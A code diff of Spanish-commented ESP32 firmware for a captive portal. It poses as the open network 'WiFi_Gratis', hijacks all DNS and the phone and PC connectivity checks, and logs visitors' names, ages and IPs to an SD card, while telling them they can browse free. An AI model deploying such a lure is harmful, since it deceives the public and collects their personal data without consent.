@@ -8,7 +8,7 @@
 #include <FS.h>
 
 // ========== CONFIGURACIÓN ==========
-const char* AP_SSID = "WiFi_Gratis";
+const char* AP_SSID = "WiFi_Gratis1";
 const char* AP_PASS = "";
 
 const byte DNS_PORT = 53;
@@ -27,13 +27,13 @@ void initSD() {
   delay(100);
   
   if (!SD.begin(PIN_CD)) {
-    Serial.println("❌ SD: No disponible");
+    Serial.println(" SD: No disponible");
     return;
   }
-  Serial.println("✅ SD: OK");
+  Serial.println(" SD: OK");
   
   // Listar contenido de la SD
-  Serial.println("📁 Archivos en SD:");
+  Serial.println(" Archivos en SD:");
   File root = SD.open("/");
   File file = root.openNextFile();
   while(file) {
@@ -65,7 +65,7 @@ void initSD() {
       file.println("=== CAPTIVE PORTAL LOG ===");
       file.println("Timestamp,Nombre,Edad,IP");
       file.close();
-      Serial.println("✅ Archivo de log creado");
+      Serial.println(" Archivo de log creado");
     }
   }
 }
@@ -84,7 +84,7 @@ void logToSD(const String& nombre, const String& edad, const String& ip) {
     file.print(",");
     file.println(ip);
     file.close();
-    Serial.println("📝 Log: " + nombre + ", " + edad + ", " + ip);
+    Serial.println(" Log: " + nombre + ", " + edad + ", " + ip);
     capturedCount++;
   }
 }
@@ -92,7 +92,7 @@ void logToSD(const String& nombre, const String& edad, const String& ip) {
 // ========== SERVIDOR DE ARCHIVOS DESDE SD ==========
 bool serveFileFromSD(String path) {
   if (!SD.begin(PIN_CD)) {
-    Serial.println("❌ SD no disponible para servir archivos");
+    Serial.println(" SD no disponible para servir archivos");
     return false;
   }
   
@@ -113,16 +113,16 @@ bool serveFileFromSD(String path) {
     path = "/portal/index.html";
   }
   
-  Serial.println("🔍 Buscando: " + path);
+  Serial.println(" Buscando: " + path);
   
   if (!SD.exists(path)) {
-    Serial.println("❌ No encontrado: " + path);
+    Serial.println(" No encontrado: " + path);
     return false;
   }
   
   File file = SD.open(path, FILE_READ);
   if (!file) {
-    Serial.println("❌ No se pudo abrir: " + path);
+    Serial.println(" No se pudo abrir: " + path);
     return false;
   }
   
@@ -136,7 +136,7 @@ bool serveFileFromSD(String path) {
   else if (path.endsWith(".txt")) contentType = "text/plain";
   else if (path.endsWith(".json")) contentType = "application/json";
   
-  Serial.println("✅ Sirviendo: " + path + " (" + file.size() + " bytes) como " + contentType);
+  Serial.println(" Sirviendo: " + path + " (" + file.size() + " bytes) como " + contentType);
   webServer.streamFile(file, contentType);
   file.close();
   return true;
@@ -177,7 +177,7 @@ void sendErrorPage(String error) {
 
 // ========== HANDLERS WEB ==========
 void handleRoot() {
-  Serial.println("🌐 Root request - Buscando /portal/index.html");
+  Serial.println(" Root request - Buscando /portal/index.html");
   if (!serveFileFromSD("/portal/index.html")) {
     sendErrorPage("Archivo no encontrado: /portal/index.html");
   }
@@ -188,7 +188,7 @@ void handleCSS() {
 }
 
 void handleSuccess() {
-  Serial.println("✅ Success request");
+  Serial.println(" Success request");
   if (!serveFileFromSD("/portal/success.html")) {
     // Si no existe success.html, mostrar mensaje simple
     String success = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Conectado</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#11998e,#38ef7d);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:#fff;border-radius:15px;box-shadow:0 10px 40px rgba(0,0,0,.2);max-width:400px;width:100%;padding:40px;text-align:center}.check{font-size:60px;margin-bottom:20px;color:#38ef7d}h1{color:#333;margin-bottom:15px}p{color:#666;line-height:1.6}</style></head><body><div class='card'><div class='check'>✓</div><h1>¡Conectado!</h1><p>Gracias por registrarte.<br>Ahora puedes navegar gratis.</p></div></body></html>";
@@ -214,17 +214,17 @@ void handleSubmit() {
 
 // ========== DETECTORES DE PORTAL CAUTIVO ==========
 void handleGenerate204() {
-  Serial.println("📱 Android 204 - OK");
+  Serial.println(" Android 204 - OK");
   webServer.send(204, "text/plain", "");
 }
 
 void handleConnectivityCheck() {
-  Serial.println("🪟 Windows NCSI - Microsoft NCSI");
+  Serial.println(" Windows NCSI - Microsoft NCSI");
   webServer.send(200, "text/plain", "Microsoft NCSI");
 }
 
 void handleHotspotDetect() {
-  Serial.println("🍎 iOS hotspot - Redirect");
+  Serial.println(" iOS hotspot - Redirect");
   String html = "<!DOCTYPE html><html><head>";
   html += "<meta http-equiv='refresh' content='0;url=http://192.168.4.1/'>";
   html += "</head><body></body></html>";
@@ -232,12 +232,12 @@ void handleHotspotDetect() {
 }
 
 void handleSuccessTxt() {
-  Serial.println("🍎 iOS success.txt");
+  Serial.println(" iOS success.txt");
   webServer.send(200, "text/plain", "success");
 }
 
 void handleRedirect() {
-  Serial.println("🪟 Windows redirect");
+  Serial.println(" Windows redirect");
   webServer.sendHeader("Location", "http://192.168.4.1/", true);
   webServer.send(302, "text/plain", "");
 }
@@ -248,7 +248,7 @@ void handleNotFound() {
   String ip = webServer.client().remoteIP().toString();
   String userAgent = webServer.header("User-Agent");
   
-  Serial.println("\n🔴 NUEVA PETICIÓN:");
+  Serial.println("\n NUEVA PETICIÓN:");
   Serial.println("   URL: " + uri);
   Serial.println("   IP: " + ip);
   if (userAgent.length() > 0) {
@@ -266,7 +266,7 @@ void handleNotFound() {
   
   // iOS
   if (uri == "/hotspot-detect.html") {
-    Serial.println("   🍎 iOS hotspot-detect - Redirect");
+    Serial.println("    iOS hotspot-detect - Redirect");
     String html = "<!DOCTYPE html><html><head>";
     html += "<meta http-equiv='refresh' content='0;url=http://192.168.4.1/'>";
     html += "</head><body></body></html>";
@@ -275,7 +275,7 @@ void handleNotFound() {
   }
   
   if (uri == "/library/test/success.html") {
-    Serial.println("   🍎 iOS library/test - Redirect");
+    Serial.println("    iOS library/test - Redirect");
     String html = "<!DOCTYPE html><html><head>";
     html += "<meta http-equiv='refresh' content='0;url=http://192.168.4.1/'>";
     html += "</head><body></body></html>";
@@ -284,26 +284,26 @@ void handleNotFound() {
   }
   
   if (uri == "/success.txt") {
-    Serial.println("   🍎 iOS success.txt");
+    Serial.println("    iOS success.txt");
     webServer.send(200, "text/plain", "success");
     return;
   }
   
   // WINDOWS
   if (uri == "/ncsi.txt") {
-    Serial.println("   🪟 Windows ncsi.txt");
+    Serial.println("    Windows ncsi.txt");
     webServer.send(200, "text/plain", "Microsoft NCSI");
     return;
   }
   
   if (uri == "/connecttest.txt") {
-    Serial.println("   🪟 Windows connecttest.txt");
+    Serial.println("    Windows connecttest.txt");
     webServer.send(200, "text/plain", "Microsoft NCSI");
     return;
   }
   
   if (uri == "/redirect") {
-    Serial.println("   🪟 Windows redirect");
+    Serial.println("    Windows redirect");
     webServer.sendHeader("Location", "http://192.168.4.1/", true);
     webServer.send(302, "text/plain", "");
     return;
@@ -313,14 +313,14 @@ void handleNotFound() {
   if (uri.startsWith("/portal/") || uri.startsWith("/css/") || uri.startsWith("/js/") || 
       uri.endsWith(".css") || uri.endsWith(".js") || uri.endsWith(".png") || 
       uri.endsWith(".jpg") || uri.endsWith(".ico")) {
-    Serial.println("   📁 Intentando servir archivo estático");
+    Serial.println("    Intentando servir archivo estático");
     if (serveFileFromSD(uri)) {
       return;
     }
   }
   
   // ===== SI ES LA PRIMERA PETICIÓN O NO ES DETECTOR =====
-  Serial.println("   📲 REDIRIGIENDO a http://192.168.4.1/ para activar notificación");
+  Serial.println("    REDIRIGIENDO a http://192.168.4.1/ para activar notificación");
   webServer.sendHeader("Location", "http://192.168.4.1/", true);
   webServer.send(302, "text/plain", "");
 }
@@ -330,7 +330,7 @@ void startCaptivePortal() {
   if (captiveRunning) return;
   
   Serial.println("\n\n=================================");
-  Serial.println("🚀 INICIANDO PORTAL CAUTIVO");
+  Serial.println(" INICIANDO PORTAL CAUTIVO");
   Serial.println("=================================");
   
   initSD();
@@ -342,9 +342,9 @@ void startCaptivePortal() {
   
   delay(100);
   
-  Serial.print("📡 IP: ");
+  Serial.print(" IP: ");
   Serial.println(WiFi.softAPIP());
-  Serial.print("📡 SSID: ");
+  Serial.print(" SSID: ");
   Serial.println(AP_SSID);
   
   // DNS: capturar TODOS los dominios
@@ -385,14 +385,14 @@ void startCaptivePortal() {
   captiveRunning = true;
   capturedCount = 0;
   
-  Serial.println("✅ PORTAL CAUTIVO ACTIVO");
+  Serial.println(" PORTAL CAUTIVO ACTIVO");
   Serial.println("=================================\n");
 }
 
 void stopCaptivePortal() {
   if (!captiveRunning) return;
   
-  Serial.println("🛑 Deteniendo Portal Cautivo...");
+  Serial.println(" Deteniendo Portal Cautivo...");
   
   webServer.stop();
   dnsServer.stop();
@@ -400,7 +400,7 @@ void stopCaptivePortal() {
   WiFi.mode(WIFI_OFF);
   
   captiveRunning = false;
-  Serial.println("✅ Portal Cautivo DETENIDO");
+  Serial.println(" Portal Cautivo DETENIDO");
 }
 
 bool isCaptiveRunning() {
